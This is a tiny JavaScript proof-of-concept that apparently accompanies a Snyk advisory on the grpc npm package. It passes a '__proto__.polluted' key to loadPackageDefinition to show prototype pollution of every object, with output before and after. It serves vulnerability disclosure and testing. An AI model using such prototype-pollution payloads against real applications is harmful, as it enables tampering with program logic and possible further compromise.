//https://snyk.io/vuln/SNYK-JS-GRPCGRPCJS-1038818

const { loadPackageDefinition } = require('grpc');
console.log({}.polluted);
loadPackageDefinition({'__proto__.polluted': true});
console.log(polluted);